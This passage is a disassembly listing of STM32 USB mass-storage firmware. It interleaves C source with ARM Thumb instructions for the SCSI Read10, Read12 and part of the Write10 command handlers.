 800a326:	e005      	b.n	800a334 <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a328:	697b      	ldr	r3, [r7, #20]
 800a32a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a32e:	2201      	movs	r2, #1
 800a330:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a334:	697b      	ldr	r3, [r7, #20]
 800a336:	2200      	movs	r2, #0
 800a338:	60da      	str	r2, [r3, #12]

  return 0;
 800a33a:	2300      	movs	r3, #0
}
 800a33c:	4618      	mov	r0, r3
 800a33e:	371c      	adds	r7, #28
 800a340:	46bd      	mov	sp, r7
 800a342:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a346:	4770      	bx	lr

0800a348 <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a348:	b580      	push	{r7, lr}
 800a34a:	b086      	sub	sp, #24
 800a34c:	af00      	add	r7, sp, #0
 800a34e:	60f8      	str	r0, [r7, #12]
 800a350:	460b      	mov	r3, r1
 800a352:	607a      	str	r2, [r7, #4]
 800a354:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a356:	68fb      	ldr	r3, [r7, #12]
 800a358:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a35c:	68fb      	ldr	r3, [r7, #12]
 800a35e:	32b0      	adds	r2, #176	; 0xb0
 800a360:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a364:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a366:	697b      	ldr	r3, [r7, #20]
 800a368:	2b00      	cmp	r3, #0
 800a36a:	d102      	bne.n	800a372 <SCSI_Read10+0x2a>
  {
    return -1;
 800a36c:	f04f 33ff 	mov.w	r3, #4294967295
 800a370:	e09d      	b.n	800a4ae <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a372:	697b      	ldr	r3, [r7, #20]
 800a374:	7a1b      	ldrb	r3, [r3, #8]
 800a376:	2b00      	cmp	r3, #0
 800a378:	f040 808f 	bne.w	800a49a <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a37c:	697b      	ldr	r3, [r7, #20]
 800a37e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a382:	7f1b      	ldrb	r3, [r3, #28]
 800a384:	b25b      	sxtb	r3, r3
 800a386:	2b00      	cmp	r3, #0
 800a388:	db0b      	blt.n	800a3a2 <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a38a:	697b      	ldr	r3, [r7, #20]
 800a38c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a390:	7f59      	ldrb	r1, [r3, #29]
 800a392:	2320      	movs	r3, #32
 800a394:	2205      	movs	r2, #5
 800a396:	68f8      	ldr	r0, [r7, #12]
 800a398:	f7ff feec 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a39c:	f04f 33ff 	mov.w	r3, #4294967295
 800a3a0:	e085      	b.n	800a4ae <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a3a2:	697b      	ldr	r3, [r7, #20]
 800a3a4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3a8:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a3ac:	2b02      	cmp	r3, #2
 800a3ae:	d108      	bne.n	800a3c2 <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a3b0:	7af9      	ldrb	r1, [r7, #11]
 800a3b2:	233a      	movs	r3, #58	; 0x3a
 800a3b4:	2202      	movs	r2, #2
 800a3b6:	68f8      	ldr	r0, [r7, #12]
 800a3b8:	f7ff fedc 	bl	800a174 <SCSI_SenseCode>

      return -1;
 800a3bc:	f04f 33ff 	mov.w	r3, #4294967295
 800a3c0:	e075      	b.n	800a4ae <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a3c2:	68fb      	ldr	r3, [r7, #12]
 800a3c4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a3c8:	68fa      	ldr	r2, [r7, #12]
 800a3ca:	33b0      	adds	r3, #176	; 0xb0
 800a3cc:	009b      	lsls	r3, r3, #2
 800a3ce:	4413      	add	r3, r2
 800a3d0:	685b      	ldr	r3, [r3, #4]
 800a3d2:	689b      	ldr	r3, [r3, #8]
 800a3d4:	7afa      	ldrb	r2, [r7, #11]
 800a3d6:	4610      	mov	r0, r2
 800a3d8:	4798      	blx	r3
 800a3da:	4603      	mov	r3, r0
 800a3dc:	2b00      	cmp	r3, #0
 800a3de:	d008      	beq.n	800a3f2 <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a3e0:	7af9      	ldrb	r1, [r7, #11]
 800a3e2:	233a      	movs	r3, #58	; 0x3a
 800a3e4:	2202      	movs	r2, #2
 800a3e6:	68f8      	ldr	r0, [r7, #12]
 800a3e8:	f7ff fec4 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a3ec:	f04f 33ff 	mov.w	r3, #4294967295
 800a3f0:	e05d      	b.n	800a4ae <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a3f2:	687b      	ldr	r3, [r7, #4]
 800a3f4:	3302      	adds	r3, #2
 800a3f6:	781b      	ldrb	r3, [r3, #0]
 800a3f8:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a3fa:	687b      	ldr	r3, [r7, #4]
 800a3fc:	3303      	adds	r3, #3
 800a3fe:	781b      	ldrb	r3, [r3, #0]
 800a400:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a402:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a404:	687b      	ldr	r3, [r7, #4]
 800a406:	3304      	adds	r3, #4
 800a408:	781b      	ldrb	r3, [r3, #0]
 800a40a:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a40c:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a40e:	687a      	ldr	r2, [r7, #4]
 800a410:	3205      	adds	r2, #5
 800a412:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a414:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a416:	697a      	ldr	r2, [r7, #20]
 800a418:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a41c:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a41e:	687b      	ldr	r3, [r7, #4]
 800a420:	3307      	adds	r3, #7
 800a422:	781b      	ldrb	r3, [r3, #0]
 800a424:	021b      	lsls	r3, r3, #8
 800a426:	687a      	ldr	r2, [r7, #4]
 800a428:	3208      	adds	r2, #8
 800a42a:	7812      	ldrb	r2, [r2, #0]
 800a42c:	4313      	orrs	r3, r2
 800a42e:	697a      	ldr	r2, [r7, #20]
 800a430:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a434:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a436:	697b      	ldr	r3, [r7, #20]
 800a438:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a43c:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a43e:	697b      	ldr	r3, [r7, #20]
 800a440:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a444:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a446:	7af9      	ldrb	r1, [r7, #11]
 800a448:	68f8      	ldr	r0, [r7, #12]
 800a44a:	f000 fb0c 	bl	800aa66 <SCSI_CheckAddressRange>
 800a44e:	4603      	mov	r3, r0
 800a450:	2b00      	cmp	r3, #0
 800a452:	da02      	bge.n	800a45a <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a454:	f04f 33ff 	mov.w	r3, #4294967295
 800a458:	e029      	b.n	800a4ae <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a45a:	697b      	ldr	r3, [r7, #20]
 800a45c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a460:	699a      	ldr	r2, [r3, #24]
 800a462:	697b      	ldr	r3, [r7, #20]
 800a464:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a468:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a46a:	6979      	ldr	r1, [r7, #20]
 800a46c:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a470:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a474:	fb01 f303 	mul.w	r3, r1, r3
 800a478:	429a      	cmp	r2, r3
 800a47a:	d00b      	beq.n	800a494 <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a47c:	697b      	ldr	r3, [r7, #20]
 800a47e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a482:	7f59      	ldrb	r1, [r3, #29]
 800a484:	2320      	movs	r3, #32
 800a486:	2205      	movs	r2, #5
 800a488:	68f8      	ldr	r0, [r7, #12]
 800a48a:	f7ff fe73 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a48e:	f04f 33ff 	mov.w	r3, #4294967295
 800a492:	e00c      	b.n	800a4ae <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a494:	697b      	ldr	r3, [r7, #20]
 800a496:	2202      	movs	r2, #2
 800a498:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a49a:	697b      	ldr	r3, [r7, #20]
 800a49c:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a4a0:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a4a2:	7afb      	ldrb	r3, [r7, #11]
 800a4a4:	4619      	mov	r1, r3
 800a4a6:	68f8      	ldr	r0, [r7, #12]
 800a4a8:	f000 fb0a 	bl	800aac0 <SCSI_ProcessRead>
 800a4ac:	4603      	mov	r3, r0
}
 800a4ae:	4618      	mov	r0, r3
 800a4b0:	3718      	adds	r7, #24
 800a4b2:	46bd      	mov	sp, r7
 800a4b4:	bd80      	pop	{r7, pc}

0800a4b6 <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a4b6:	b580      	push	{r7, lr}
 800a4b8:	b086      	sub	sp, #24
 800a4ba:	af00      	add	r7, sp, #0
 800a4bc:	60f8      	str	r0, [r7, #12]
 800a4be:	460b      	mov	r3, r1
 800a4c0:	607a      	str	r2, [r7, #4]
 800a4c2:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a4c4:	68fb      	ldr	r3, [r7, #12]
 800a4c6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a4ca:	68fb      	ldr	r3, [r7, #12]
 800a4cc:	32b0      	adds	r2, #176	; 0xb0
 800a4ce:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a4d2:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a4d4:	697b      	ldr	r3, [r7, #20]
 800a4d6:	2b00      	cmp	r3, #0
 800a4d8:	d102      	bne.n	800a4e0 <SCSI_Read12+0x2a>
  {
    return -1;
 800a4da:	f04f 33ff 	mov.w	r3, #4294967295
 800a4de:	e0a7      	b.n	800a630 <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a4e0:	697b      	ldr	r3, [r7, #20]
 800a4e2:	7a1b      	ldrb	r3, [r3, #8]
 800a4e4:	2b00      	cmp	r3, #0
 800a4e6:	f040 8099 	bne.w	800a61c <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a4ea:	697b      	ldr	r3, [r7, #20]
 800a4ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4f0:	7f1b      	ldrb	r3, [r3, #28]
 800a4f2:	b25b      	sxtb	r3, r3
 800a4f4:	2b00      	cmp	r3, #0
 800a4f6:	db0b      	blt.n	800a510 <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a4f8:	697b      	ldr	r3, [r7, #20]
 800a4fa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4fe:	7f59      	ldrb	r1, [r3, #29]
 800a500:	2320      	movs	r3, #32
 800a502:	2205      	movs	r2, #5
 800a504:	68f8      	ldr	r0, [r7, #12]
 800a506:	f7ff fe35 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a50a:	f04f 33ff 	mov.w	r3, #4294967295
 800a50e:	e08f      	b.n	800a630 <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a510:	697b      	ldr	r3, [r7, #20]
 800a512:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a516:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a51a:	2b02      	cmp	r3, #2
 800a51c:	d108      	bne.n	800a530 <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a51e:	7af9      	ldrb	r1, [r7, #11]
 800a520:	233a      	movs	r3, #58	; 0x3a
 800a522:	2202      	movs	r2, #2
 800a524:	68f8      	ldr	r0, [r7, #12]
 800a526:	f7ff fe25 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a52a:	f04f 33ff 	mov.w	r3, #4294967295
 800a52e:	e07f      	b.n	800a630 <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a530:	68fb      	ldr	r3, [r7, #12]
 800a532:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a536:	68fa      	ldr	r2, [r7, #12]
 800a538:	33b0      	adds	r3, #176	; 0xb0
 800a53a:	009b      	lsls	r3, r3, #2
 800a53c:	4413      	add	r3, r2
 800a53e:	685b      	ldr	r3, [r3, #4]
 800a540:	689b      	ldr	r3, [r3, #8]
 800a542:	7afa      	ldrb	r2, [r7, #11]
 800a544:	4610      	mov	r0, r2
 800a546:	4798      	blx	r3
 800a548:	4603      	mov	r3, r0
 800a54a:	2b00      	cmp	r3, #0
 800a54c:	d008      	beq.n	800a560 <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a54e:	7af9      	ldrb	r1, [r7, #11]
 800a550:	233a      	movs	r3, #58	; 0x3a
 800a552:	2202      	movs	r2, #2
 800a554:	68f8      	ldr	r0, [r7, #12]
 800a556:	f7ff fe0d 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a55a:	f04f 33ff 	mov.w	r3, #4294967295
 800a55e:	e067      	b.n	800a630 <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a560:	687b      	ldr	r3, [r7, #4]
 800a562:	3302      	adds	r3, #2
 800a564:	781b      	ldrb	r3, [r3, #0]
 800a566:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a568:	687b      	ldr	r3, [r7, #4]
 800a56a:	3303      	adds	r3, #3
 800a56c:	781b      	ldrb	r3, [r3, #0]
 800a56e:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a570:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a572:	687b      	ldr	r3, [r7, #4]
 800a574:	3304      	adds	r3, #4
 800a576:	781b      	ldrb	r3, [r3, #0]
 800a578:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a57a:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a57c:	687a      	ldr	r2, [r7, #4]
 800a57e:	3205      	adds	r2, #5
 800a580:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a582:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a584:	697a      	ldr	r2, [r7, #20]
 800a586:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a58a:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a58c:	687b      	ldr	r3, [r7, #4]
 800a58e:	3306      	adds	r3, #6
 800a590:	781b      	ldrb	r3, [r3, #0]
 800a592:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a594:	687b      	ldr	r3, [r7, #4]
 800a596:	3307      	adds	r3, #7
 800a598:	781b      	ldrb	r3, [r3, #0]
 800a59a:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a59c:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a59e:	687b      	ldr	r3, [r7, #4]
 800a5a0:	3308      	adds	r3, #8
 800a5a2:	781b      	ldrb	r3, [r3, #0]
 800a5a4:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a5a6:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a5a8:	687a      	ldr	r2, [r7, #4]
 800a5aa:	3209      	adds	r2, #9
 800a5ac:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a5ae:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a5b0:	697a      	ldr	r2, [r7, #20]
 800a5b2:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a5b6:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a5b8:	697b      	ldr	r3, [r7, #20]
 800a5ba:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5be:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a5c0:	697b      	ldr	r3, [r7, #20]
 800a5c2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5c6:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a5c8:	7af9      	ldrb	r1, [r7, #11]
 800a5ca:	68f8      	ldr	r0, [r7, #12]
 800a5cc:	f000 fa4b 	bl	800aa66 <SCSI_CheckAddressRange>
 800a5d0:	4603      	mov	r3, r0
 800a5d2:	2b00      	cmp	r3, #0
 800a5d4:	da02      	bge.n	800a5dc <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a5d6:	f04f 33ff 	mov.w	r3, #4294967295
 800a5da:	e029      	b.n	800a630 <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a5dc:	697b      	ldr	r3, [r7, #20]
 800a5de:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5e2:	699a      	ldr	r2, [r3, #24]
 800a5e4:	697b      	ldr	r3, [r7, #20]
 800a5e6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5ea:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a5ec:	6979      	ldr	r1, [r7, #20]
 800a5ee:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a5f2:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a5f6:	fb01 f303 	mul.w	r3, r1, r3
 800a5fa:	429a      	cmp	r2, r3
 800a5fc:	d00b      	beq.n	800a616 <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a5fe:	697b      	ldr	r3, [r7, #20]
 800a600:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a604:	7f59      	ldrb	r1, [r3, #29]
 800a606:	2320      	movs	r3, #32
 800a608:	2205      	movs	r2, #5
 800a60a:	68f8      	ldr	r0, [r7, #12]
 800a60c:	f7ff fdb2 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a610:	f04f 33ff 	mov.w	r3, #4294967295
 800a614:	e00c      	b.n	800a630 <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a616:	697b      	ldr	r3, [r7, #20]
 800a618:	2202      	movs	r2, #2
 800a61a:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a61c:	697b      	ldr	r3, [r7, #20]
 800a61e:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a622:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a624:	7afb      	ldrb	r3, [r7, #11]
 800a626:	4619      	mov	r1, r3
 800a628:	68f8      	ldr	r0, [r7, #12]
 800a62a:	f000 fa49 	bl	800aac0 <SCSI_ProcessRead>
 800a62e:	4603      	mov	r3, r0
}
 800a630:	4618      	mov	r0, r3
 800a632:	3718      	adds	r7, #24
 800a634:	46bd      	mov	sp, r7
 800a636:	bd80      	pop	{r7, pc}

0800a638 <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a638:	b580      	push	{r7, lr}
 800a63a:	b086      	sub	sp, #24
 800a63c:	af00      	add	r7, sp, #0
 800a63e:	60f8      	str	r0, [r7, #12]
 800a640:	460b      	mov	r3, r1
 800a642:	607a      	str	r2, [r7, #4]
 800a644:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a646:	68fb      	ldr	r3, [r7, #12]
 800a648:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a64c:	68fb      	ldr	r3, [r7, #12]
 800a64e:	32b0      	adds	r2, #176	; 0xb0
 800a650:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a654:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a656:	697b      	ldr	r3, [r7, #20]
 800a658:	2b00      	cmp	r3, #0
 800a65a:	d102      	bne.n	800a662 <SCSI_Write10+0x2a>
  {
    return -1;
 800a65c:	f04f 33ff 	mov.w	r3, #4294967295
 800a660:	e0c7      	b.n	800a7f2 <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a662:	697b      	ldr	r3, [r7, #20]
 800a664:	7a1b      	ldrb	r3, [r3, #8]
 800a666:	2b00      	cmp	r3, #0
 800a668:	f040 80bd 	bne.w	800a7e6 <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a66c:	697b      	ldr	r3, [r7, #20]
 800a66e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a672:	699b      	ldr	r3, [r3, #24]
 800a674:	2b00      	cmp	r3, #0
 800a676:	d10b      	bne.n	800a690 <SCSI_Write10+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a678:	697b      	ldr	r3, [r7, #20]
 800a67a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a67e:	7f59      	ldrb	r1, [r3, #29]
 800a680:	2320      	movs	r3, #32
 800a682:	2205      	movs	r2, #5
 800a684:	68f8      	ldr	r0, [r7, #12]
 800a686:	f7ff fd75 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a68a:	f04f 33ff 	mov.w	r3, #4294967295
 800a68e:	e0b0      	b.n	800a7f2 <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a690:	697b      	ldr	r3, [r7, #20]
 800a692:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a696:	7f1b      	ldrb	r3, [r3, #28]
 800a698:	b25b      	sxtb	r3, r3
 800a69a:	2b00      	cmp	r3, #0
 800a69c:	da0b      	bge.n	800a6b6 <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a69e:	697b      	ldr	r3, [r7, #20]
 800a6a0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6a4:	7f59      	ldrb	r1, [r3, #29]
 800a6a6:	2320      	movs	r3, #32
 800a6a8:	2205      	movs	r2, #5
 800a6aa:	68f8      	ldr	r0, [r7, #12]
 800a6ac:	f7ff fd62 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a6b0:	f04f 33ff 	mov.w	r3, #4294967295
 800a6b4:	e09d      	b.n	800a7f2 <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a6b6:	68fb      	ldr	r3, [r7, #12]
 800a6b8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a6bc:	68fa      	ldr	r2, [r7, #12]
 800a6be:	33b0      	adds	r3, #176	; 0xb0
 800a6c0:	009b      	lsls	r3, r3, #2
 800a6c2:	4413      	add	r3, r2
 800a6c4:	685b      	ldr	r3, [r3, #4]
 800a6c6:	689b      	ldr	r3, [r3, #8]
 800a6c8:	7afa      	ldrb	r2, [r7, #11]
 800a6ca:	4610      	mov	r0, r2
 800a6cc:	4798      	blx	r3
 800a6ce:	4603      	mov	r3, r0
 800a6d0:	2b00      	cmp	r3, #0
 800a6d2:	d008      	beq.n	800a6e6 <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a6d4:	7af9      	ldrb	r1, [r7, #11]
 800a6d6:	233a      	movs	r3, #58	; 0x3a
 800a6d8:	2202      	movs	r2, #2
 800a6da:	68f8      	ldr	r0, [r7, #12]
 800a6dc:	f7ff fd4a 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a6e0:	f04f 33ff 	mov.w	r3, #4294967295
 800a6e4:	e085      	b.n	800a7f2 <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a6e6:	68fb      	ldr	r3, [r7, #12]
 800a6e8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a6ec:	68fa      	ldr	r2, [r7, #12]
 800a6ee:	33b0      	adds	r3, #176	; 0xb0
 800a6f0:	009b      	lsls	r3, r3, #2
 800a6f2:	4413      	add	r3, r2
 800a6f4:	685b      	ldr	r3, [r3, #4]
 800a6f6:	68db      	ldr	r3, [r3, #12]
 800a6f8:	7afa      	ldrb	r2, [r7, #11]
 800a6fa:	4610      	mov	r0, r2
 800a6fc:	4798      	blx	r3
 800a6fe:	4603      	mov	r3, r0
 800a700:	2b00      	cmp	r3, #0
 800a702:	d008      	beq.n	800a716 <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a704:	7af9      	ldrb	r1, [r7, #11]
 800a706:	2327      	movs	r3, #39	; 0x27
 800a708:	2202      	movs	r2, #2
 800a70a:	68f8      	ldr	r0, [r7, #12]
 800a70c:	f7ff fd32 	bl	800a174 <SCSI_SenseCode>
      return -1;
 800a710:	f04f 33ff 	mov.w	r3, #4294967295
 800a714:	e06d      	b.n	800a7f2 <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a716:	687b      	ldr	r3, [r7, #4]
 800a718:	3302      	adds	r3, #2
 800a71a:	781b      	ldrb	r3, [r3, #0]
 800a71c:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a71e:	687b      	ldr	r3, [r7, #4]
 800a720:	3303      	adds	r3, #3
